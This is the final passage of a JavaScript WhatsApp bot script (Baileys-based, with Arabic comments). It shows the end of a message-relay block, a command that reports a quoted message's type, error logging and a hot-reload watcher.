                                    phone_number: "+201286008203" // استبدل برقم الهاتف الفعلي
                                })
                            }
                        ]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: idch,
                            newsletterName: ownername,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    return await XeonBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

case 'getmtype': case 'نوع_الرسالة': case 'نوع': {
    if (!m.quoted) return replygcxeon('رد على رسالة لمعرفة نوعها!');
    const quotedMtype = m.quoted.mtype || 'غير معروف';
    console.log(`نوع الرسالة: ${quotedMtype}`);
    await replygcxeon(`نوع الرسالة: ${quotedMtype}`);
}
break;

default:
}
} catch (err) {
    console.log(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`تم تحديث ${__filename}`)
    delete require.cache[file]
    require(file)
})